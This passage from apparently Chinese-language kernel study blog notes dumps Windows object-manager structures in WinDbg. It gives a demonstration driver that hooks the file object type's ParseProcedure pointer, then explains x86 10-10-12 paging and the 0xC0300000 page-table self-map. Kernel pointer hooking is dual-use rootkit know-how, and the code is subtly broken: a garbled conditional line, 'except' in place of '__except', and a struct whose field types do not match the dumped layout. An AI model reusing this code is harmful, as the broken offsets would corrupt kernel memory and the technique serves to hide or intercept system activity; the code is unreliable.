class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : 0n41</span><br><span class="line">   +0x004 HandleCount      : 0n2</span><br><span class="line">   +0x004 NextToFree       : 0x00000002 Void</span><br><span class="line">   +0x008 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x00c TypeIndex        : 0x7 &apos;&apos;</span><br><span class="line">   +0x00d TraceFlags       : 0 &apos;&apos;</span><br><span class="line">   +0x00e InfoMask         : 0x8 &apos;&apos;</span><br><span class="line">   +0x00f Flags            : 0 &apos;&apos;</span><br><span class="line">   +0x010 ObjectCreateInfo : 0x83f78cc0 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x010 QuotaBlockCharged : 0x83f78cc0 Void</span><br><span class="line">   +0x014 SecurityDescriptor : 0x8c6f64fe Void</span><br><span class="line">   +0x018 Body             : _QUAD</span><br></pre></td></tr></table></figure><p>PointerCount保存的是对象的指针计数，HandeCount保存的是对象句柄计数（也就是我们说的引用计数）<br>当我们通过API得到对象的句柄：   </p><ul><li>打开一个对象时，对象指针计数（差了下windows内核情景分析一书，这个翻译成引用计数，感觉更好一些，因为如果是引用计数，后面获得对象就不会增加句柄计数，指挥增加引用计数）与句柄计数都会被加1。   </li><li>关闭句柄的时候，对象的指针计数和句柄计数都会被减一。   </li><li>我们在内核层获得对象时，会增加其指针计数，一般我们需要通过ObDeferenceObject降低计数。   </li><li>当指针计数与句柄计数都为0，内核对象回本销毁。  </li><li>TypeIndex表示对象的类型，他是一个数组的下标，数组名叫做ObTypeIndexTable.由nt模块导出   </li></ul><p>下面查看一下ObTypeIndexTable</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd ObTypeIndexTable</span><br><span class="line">83f86900  00000000 bad0b0b0 86544768 865446a0</span><br><span class="line">83f86910  865445d8 865de040 865def00 865dee38</span><br><span class="line">83f86920  865ded70 865deca8 865debe0 865de528</span><br><span class="line">83f86930  866059c8 86601418 86601350 866094d0</span><br><span class="line">83f86940  86609408 86609340 865f5de8 865f5d20</span><br><span class="line">83f86950  865f5c58 865fac90 865fabc8 865fab00</span><br><span class="line">83f86960  865faa38 865fa970 865fa8a8 865fa7e0</span><br><span class="line">83f86970  865fa718 86603f78 86603eb0 86603de8</span><br></pre></td></tr></table></figure><p>上面的对象是这个里面第七个位置的类型，查看一下，7号位置就是865dee38，他是_OBJECT_TYPE的地址。我们查看_OBJECT_TYPE的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE 865dee38</span><br><span class="line">ntdll!_OBJECT_TYPE</span><br><span class="line">   +0x000 TypeList         : _LIST_ENTRY [ 0x865dee38 - 0x865dee38 ]</span><br><span class="line">   +0x008 Name             : _UNICODE_STRING &quot;Process&quot;</span><br><span class="line">   +0x010 DefaultObject    : (null) </span><br><span class="line">   +0x014 Index            : 0x7 &apos;&apos;</span><br><span class="line">   +0x018 TotalNumberOfObjects : 0x23</span><br><span class="line">   +0x01c TotalNumberOfHandles : 0xcc</span><br><span class="line">   +0x020 HighWaterNumberOfObjects : 0x2a</span><br><span class="line">   +0x024 HighWaterNumberOfHandles : 0x104</span><br><span class="line">   +0x028 TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +0x078 TypeLock         : _EX_PUSH_LOCK</span><br><span class="line">   +0x07c Key              : 0x636f7250</span><br><span class="line">   +0x080 CallbackList     : _LIST_ENTRY [ 0x865deeb8 - 0x865deeb8 ]</span><br></pre></td></tr></table></figure><p>接下来，我们再分析一下_OBJECT_TYPE,其中有一个TypeInfo类型是OBJECT_TYPE_INITIALIZER</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE_INITIALIZER</span><br><span class="line">ntdll!_OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +0x000 Length           : Uint2B</span><br><span class="line">   +0x002 ObjectTypeFlags  : UChar</span><br><span class="line">   +0x002 CaseInsensitive  : Pos 0, 1 Bit</span><br><span class="line">   +0x002 UnnamedObjectsOnly : Pos 1, 1 Bit</span><br><span class="line">   +0x002 UseDefaultObject : Pos 2, 1 Bit</span><br><span class="line">   +0x002 SecurityRequired : Pos 3, 1 Bit</span><br><span class="line">   +0x002 MaintainHandleCount : Pos 4, 1 Bit</span><br><span class="line">   +0x002 MaintainTypeList : Pos 5, 1 Bit</span><br><span class="line">   +0x002 SupportsObjectCallbacks : Pos 6, 1 Bit</span><br><span class="line">   +0x004 ObjectTypeCode   : Uint4B</span><br><span class="line">   +0x008 InvalidAttributes : Uint4B</span><br><span class="line">   +0x00c GenericMapping   : _GENERIC_MAPPING</span><br><span class="line">   +0x01c ValidAccessMask  : Uint4B</span><br><span class="line">   +0x020 RetainAccess     : Uint4B</span><br><span class="line">   +0x024 PoolType         : _POOL_TYPE</span><br><span class="line">   +0x028 DefaultPagedPoolCharge : Uint4B</span><br><span class="line">   +0x02c DefaultNonPagedPoolCharge : Uint4B</span><br><span class="line">   +0x030 DumpProcedure    : Ptr32     void </span><br><span class="line">   +0x034 OpenProcedure    : Ptr32     long </span><br><span class="line">   +0x038 CloseProcedure   : Ptr32     void </span><br><span class="line">   +0x03c DeleteProcedure  : Ptr32     void </span><br><span class="line">   +0x040 ParseProcedure   : Ptr32     long </span><br><span class="line">   +0x044 SecurityProcedure : Ptr32     long </span><br><span class="line">   +0x048 QueryNameProcedure : Ptr32     long </span><br><span class="line">   +0x04c OkayToCloseProcedure : Ptr32     unsigned char</span><br></pre></td></tr></table></figure><p>我们在内核层经常需要使用一个内核对象句柄获得内核对象，比如用户层传入一个时间对象句柄，用于分析内核层与用户层进行同步。<br>我们可以使用ObReferenceObjectByHandle函数根据句柄获得内核对象<br>注意：   </p><ul><li>当你调用这个函数时候，需要确保处于当前进程环境。   </li><li>用户模式的句柄，将AccessMode指定为userMode   </li><li>使用完毕，请调用ObDererfanceObject降低指针引用计数。   </li></ul><h1 id="下面就是相关的代码"><a href="#下面就是相关的代码" class="headerlink" title="下面就是相关的代码"></a>下面就是相关的代码</h1><p>通过内核对下头部，能够获得此类型内核对象的创建信息，在这些信息中有一组函数指针非常重要。<br>我们通过Hook这些函数指针，能够达到监控内核对象操作的目的。<br>这种Hook被称为Object-Hook，下面的代码平台是Win32<br>总得来说就是找到地址然后把在OBJECT_TYPE里OBJECT_TYPE_INITIALIZER的参数ParseProcedure替换成自己的    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT objDriver)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ULONG</span><span class="params">(*OBGETOBJECTTYPE)</span><span class="params">(PVOID Object)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(*PARSEPRODECEDURE)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN PVOID ParseObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PVOID ObjectType,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PACCESS_STATE AccessState,</span></span></span><br><span class="line"><span class="function"><span class="params">IN KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="function"><span class="params">IN ULONG Attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PUNICODE_STRING CompleteName,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PUNICODE_STRING RemainingName,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PVOID Context OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PSECURITY_QUALITY_OF_SERVICE SecurityQos OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">OUT PVOID *Object)</span></span>;</span><br><span class="line">PARSEPRODECEDURE g_OldFun;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">NewParseProcedure</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN PVOID ParseObject,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PVOID ObjectType,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PACCESS_STATE AccessState,</span></span></span><br><span class="line"><span class="function"><span class="params">IN KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="function"><span class="params">IN ULONG Attributes,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PUNICODE_STRING CompleteName,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PUNICODE_STRING RemainingName,</span></span></span><br><span class="line"><span class="function"><span class="params">IN OUT PVOID Context OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">IN PSECURITY_QUALITY_OF_SERVICE SecurityQos OPTIONAL,</span></span></span><br><span class="line"><span class="function"><span class="params">OUT PVOID *Object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">KdPrint((<span class="string">"Hook Success\n"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> g_OldFun(ParseObject, ObjectType, AccessState, AccessMode, Attributes,</span><br><span class="line">CompleteName,</span><br><span class="line">RemainingName, Context, SecurityQos, Object);</span><br><span class="line">&#125;</span><br><span class="line">OBGETOBJECTTYPE g_OBGetObjectType;</span><br><span class="line"><span class="comment">//获得一个函数地址，这个函数能够通过内核对象得到内核对象的类型</span></span><br><span class="line"><span class="function">VOID <span class="title">GetObjectTypeAddress</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PUCHAR addr;</span><br><span class="line">UNICODE_STRING pslookup;</span><br><span class="line">RtlInitUnicodeString(&amp;pslookup, <span class="string">L"ObGetObjectType"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//               类似于应用层的GetProcAddress</span></span><br><span class="line">addr = (PUCHAR)MmGetSystemRoutineAddress(&amp;pslookup);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g_OBGetObjectType = (OBGETOBJECTTYPE)addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INITIALIZER</span> &#123;</span></span><br><span class="line">USHORT Length;</span><br><span class="line">UCHAR ObjectTypeFlags;</span><br><span class="line">UCHAR CaseInsensitive;</span><br><span class="line">UCHAR UnnamedObjectsOnly;</span><br><span class="line">UCHAR  UseDefaultObject;</span><br><span class="line">UCHAR  SecurityRequired;</span><br><span class="line">UCHAR MaintainHandleCount;</span><br><span class="line">UCHAR MaintainTypeList;</span><br><span class="line">UCHAR SupportsObjectCallbacks;</span><br><span class="line">UCHAR CacheAligned;</span><br><span class="line">ULONG ObjectTypeCode;</span><br><span class="line">BOOLEAN InvalidAttributes;</span><br><span class="line">GENERIC_MAPPING GenericMapping;</span><br><span class="line">BOOLEAN   ValidAccessMask;</span><br><span class="line">BOOLEAN   RetainAccess;</span><br><span class="line">POOL_TYPE PoolType;</span><br><span class="line">BOOLEAN DefaultPagedPoolCharge;</span><br><span class="line">BOOLEAN DefaultNonPagedPoolCharge;</span><br><span class="line">PVOID DumpProcedure;</span><br><span class="line">ULONG OpenProcedure;</span><br><span class="line">PVOID CloseProcedure;</span><br><span class="line">PVOID DeleteProcedure;</span><br><span class="line">ULONG ParseProcedure;</span><br><span class="line">ULONG SecurityProcedure;</span><br><span class="line">ULONG QueryNameProcedure;</span><br><span class="line">UCHAR OkayToCloseProcedure;</span><br><span class="line">&#125; OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE</span> &#123;</span></span><br><span class="line">LIST_ENTRY TypeList;</span><br><span class="line">UNICODE_STRING Name;</span><br><span class="line">PVOID DefaultObject;</span><br><span class="line">ULONG Index;</span><br><span class="line">ULONG TotalNumberOfObjects;</span><br><span class="line">ULONG TotalNumberOfHandles;</span><br><span class="line">ULONG HighWaterNumberOfObjects;</span><br><span class="line">ULONG HighWaterNumberOfHandles;</span><br><span class="line">OBJECT_TYPE_INITIALIZER TypeInfo;</span><br><span class="line">ULONG  TypeLock;</span><br><span class="line">ULONG   Key;</span><br><span class="line">LIST_ENTRY   CallbackList;</span><br><span class="line">&#125; OBJECT_TYPE, *POBJECT_TYPE;</span><br><span class="line"><span class="function">HANDLE <span class="title">KernelCreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">IN PUNICODE_STRING pstrFile, <span class="comment">// 文件路径符号链接</span></span></span></span><br><span class="line"><span class="function"><span class="params">IN BOOLEAN         bIsDir)</span>   <span class="comment">// 是否为文件夹</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE          hFile = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS        Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">IO_STATUS_BLOCK StatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ULONG           ulShareAccess =</span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;</span><br><span class="line">ULONG           ulCreateOpt =</span><br><span class="line">FILE_SYNCHRONOUS_IO_NONALERT;</span><br><span class="line"><span class="comment">// 1. 初始化OBJECT_ATTRIBUTES的内容</span></span><br><span class="line">OBJECT_ATTRIBUTES objAttrib = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ULONG             ulAttributes =</span><br><span class="line">OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;</span><br><span class="line">InitializeObjectAttributes(</span><br><span class="line">&amp;objAttrib,    <span class="comment">// 返回初始化完毕的结构体</span></span><br><span class="line">pstrFile,      <span class="comment">// 文件对象名称</span></span><br><span class="line">ulAttributes,  <span class="comment">// 对象属性</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>);   <span class="comment">// 一般为NULL</span></span><br><span class="line"><span class="comment">// 2. 创建文件对象</span></span><br><span class="line">ulCreateOpt |= bIsDir;</span><br><span class="line">FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;</span><br><span class="line">Status = ZwCreateFile(</span><br><span class="line">&amp;hFile,                <span class="comment">// 返回文件句柄</span></span><br><span class="line">GENERIC_ALL,           <span class="comment">// 文件操作描述</span></span><br><span class="line">&amp;objAttrib,            <span class="comment">// OBJECT_ATTRIBUTES</span></span><br><span class="line">&amp;StatusBlock,          <span class="comment">// 接受函数的操作结果</span></span><br><span class="line"><span class="number">0</span>,                     <span class="comment">// 初始文件大小</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL, <span class="comment">// 新建文件的属性</span></span><br><span class="line">ulShareAccess,         <span class="comment">// 文件共享方式</span></span><br><span class="line">FILE_OPEN_IF,          <span class="comment">// 文件存在则打开不存在则创建</span></span><br><span class="line">ulCreateOpt,           <span class="comment">// 打开操作的附加标志位</span></span><br><span class="line"><span class="literal">NULL</span>,                  <span class="comment">// 扩展属性区</span></span><br><span class="line"><span class="number">0</span>);                   <span class="comment">// 扩展属性区长度</span></span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(Status))</span><br><span class="line"><span class="keyword">return</span> (HANDLE)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> hFile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 随便打开一个文件，得到一个文件对象</span></span><br><span class="line">UNICODE_STRING ustrFilePath;</span><br><span class="line">RtlInitUnicodeString(&amp;ustrFilePath,</span><br><span class="line"><span class="string">L"\\??\\D:\\123.txt"</span>);</span><br><span class="line">HANDLE hFile = KernelCreateFile(&amp;ustrFilePath, FALSE);</span><br><span class="line">PVOID pObject;</span><br><span class="line">ObReferenceObjectByHandle(hFile, GENERIC_ALL, <span class="literal">NULL</span>, KernelMode, &amp;pObject, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2 通过这个文件对象得到OBJECT_TYPE这个结构体</span></span><br><span class="line">OBJECT_TYPE * FileType = <span class="literal">NULL</span>;</span><br><span class="line">FileType = (OBJECT_TYPE *)g_OBGetObjectType(pObject);</span><br><span class="line"><span class="comment">//3 把这个函数地址保存起来</span></span><br><span class="line">g_OldFun = (PARSEPRODECEDURE)FileType-&gt;TypeInfo.ParseProcedure;</span><br><span class="line"><span class="comment">//4 把这个函数地址替换为自己的函数。</span></span><br><span class="line">FileType-&gt;TypeInfo.ParseProcedure = (ULONG)NewParseProcedure;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OffHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">PDRIVER_OBJECT  pDriver,</span></span></span><br><span class="line"><span class="function"><span class="params">PUNICODE_STRING strRegPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 避免编译器报未引用参数的警告</span></span><br><span class="line">UNREFERENCED_PARAMETER(strRegPath);</span><br><span class="line"><span class="comment">// 打印一行字符串，并注册驱动卸载函数，以便于驱动卸载</span></span><br><span class="line">DbgBreakPoint();<span class="comment">//_asm int 3</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">GetObjectTypeAddress();</span><br><span class="line">OnHook();</span><br><span class="line">&#125;</span><br><span class="line">except(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">KdPrint((<span class="string">"掠过一个异常\n"</span>));</span><br><span class="line">&#125;</span><br><span class="line">KdPrint((<span class="string">"My First Dirver!"</span>));</span><br><span class="line">pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT objDriver)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 避免编译器报未引用参数的警告</span></span><br><span class="line">UNREFERENCED_PARAMETER(objDriver);</span><br><span class="line"><span class="comment">// 什么也不做，只打印一行字符串</span></span><br><span class="line">KdPrint((<span class="string">"My Dirver is unloading..."</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：毛德操，《Windows内核情景分析》<br>[2]: 一大堆的别人的博客  </p>]]></content>
      
      <categories>
          
          <category> 笔记 - Hook笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核学习 </tag>
            
            <tag> Object—Hook </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>保护模式之页相关的笔记</title>
      <link href="/2018/06/25/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%A1%B5%E7%9B%B8%E5%85%B3%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/06/25/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B9%8B%E9%A1%B5%E7%9B%B8%E5%85%B3%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><p>如下指令：<br>MOV eax,dword ptr ds:[0x12345678]<br>其中,0x12345678 是有效地址<br>ds.Base + 0x12345678 是线性地址  </p><h3 id="物理地址在哪里？"><a href="#物理地址在哪里？" class="headerlink" title="物理地址在哪里？"></a>物理地址在哪里？</h3><p>CR3寄存器是所有寄存器里面，唯一一个存储物理地址的寄存器，其他都是线性地址。<br>每个进程都有一个CR3,(准确的说是都一个CR3的值，CR3本身是个寄存器，一个核，只有一套寄存器)，CR3指向一个物理页，一共4096字节（4KB）,如图：</p><h3 id="10-10-12分页"><a href="#10-10-12分页" class="headerlink" title="10-10-12分页"></a>10-10-12分页</h3><table><thead><tr><th>31到22</th><th>21到12</th><th>11到0</th></tr></thead><tbody><tr><td>10</td><td>10</td><td>12</td></tr><tr><td>目录</td><td>目录</td><td>当前这个物理页的哪个位置</td></tr></tbody></table><p>设置分页方式<br>boot里的noexecute 改成 execute   </p><h2 id="PDE与PTE"><a href="#PDE与PTE" class="headerlink" title="PDE与PTE"></a>PDE与PTE</h2><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/11.png" alt="分页机制"></p><h2 id="分析为什么是10-10-12"><a href="#分析为什么是10-10-12" class="headerlink" title="分析为什么是10-10-12"></a>分析为什么是10-10-12</h2><p>因为每个单元4字节，后3位是属性，倒着来看，比如12的原因，2的12次方是4K，所以12才能寻找所有的物理页，第二个10，每个PTE成员4字节，整个表4kB，所以有2的10次方个单元，所以有10位，第一个10位也是相同原因。   </p><h2 id="PTE特征"><a href="#PTE特征" class="headerlink" title="PTE特征"></a>PTE特征</h2><ul><li>PTE既可以指向物理页，也可以没有物理页。   </li><li>多个PTE可以指向同一个物理页。   </li><li>一个PTE只能指向一个物理页。   </li></ul><h2 id="物理页的属性"><a href="#物理页的属性" class="headerlink" title="物理页的属性"></a>物理页的属性</h2><p>物理页的属性 = PDE属性 &amp; PTE属性   </p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/12.png" alt="物理页属性"></p><h3 id="P位"><a href="#P位" class="headerlink" title="P位"></a>P位</h3><p>线性地址0 为什么不能访问呢？<br>没有指定物理页，指定物理页就一定能访问吗？<br>先看PDE与PTE的P位  P=1 才是有效的物理页   </p><h3 id="R-W-位"><a href="#R-W-位" class="headerlink" title="R/W 位"></a>R/W 位</h3><p>R/W = 0 只读<br>R/W = 1 可读可写</p><h3 id="U-S-位"><a href="#U-S-位" class="headerlink" title="U/S 位"></a>U/S 位</h3><p>U/S = 0 特权用户<br>U/S = 1 普通用户</p><h3 id="P-S位（PageSize）"><a href="#P-S位（PageSize）" class="headerlink" title="P/S位（PageSize）"></a>P/S位（PageSize）</h3><p>对PDE有意义，PS == PageSize的意思  当PS==1的时候 PDE直接指向物理页无PTE,低22位全是页内偏移。因为后面的偏移，线性地址只能拆成2段：大小为4MB，俗称“大页”</p><h3 id="A-位"><a href="#A-位" class="headerlink" title="A 位"></a>A 位</h3><p>是否被访问（读或者写）过访问过置1，即使只访问一个字节也会导致PDE PTE置1  </p><h3 id="D-位"><a href="#D-位" class="headerlink" title="D 位"></a>D 位</h3><p>脏位，是否被写过，0没有被写过，1被写过   </p><p>在上一节课课后题中我们提到过，如果系统要保证某个线性地址是有效的，那么必须为其填充正确的PDE与PTE，如果我们想填充PDE与PTE那么必须能够访问PDT与PTT，那么存在2个问题：<br>1、一定已经有“人”为我们访问PDT与PTT挂好了PDE与PTE,我们只有找到这个线性地址就可以了。<br>2、这个为我们挂好PDE与PTE的“人”是谁？</p><p>拆分C0300000<br>结论：C0300000存储的值就是PDT<br>如果我们要访问第N个PDE，那么有如下公式：<br>0xC0300000 + N*4   </p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/13.png" alt="段页"></p><p>PDT总结：<br>1、通过0xC0300000找到的物理页就是页目录表</p><p>2、这个物理页即是页目录表本身也是页表</p><p>3、页目录表是一张特殊的页表，每一项PTE指向的不是普通的物理页，而是指向其他的页表.</p><p>4、如果我们要访问第N个PDE，那么有如下公式：<br>0xC0300000 + N*4 </p><p>PTT总结：<br>1、页表被映射到了从0xC0000000到0xC03FFFFF的4M地址空间（一个页表是4KB，一共1024）<br>2、在这1024个表中有一张特殊的表：页目录表<br>3、页目录被映射到了0xC0300000开始处的4K地址空间</p><p>有了0xC0300000和0xC0000000能做什么？</p><p>掌握了这两个地址，就掌握了一个进程所有的物理内存读写权限。</p><p>公式总结：<br>1、什么是PDI与PTI<br>10-10-12  <br>2、访问页目录表的公式：<br>0xC0300000 + PDI<em>4<br>3、访问页表的公式<br>0xC0000000 + PDI</em>4096 + PTI*4</p><p><img src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/note/baohumoshi/20.png" alt="image"></p><h1 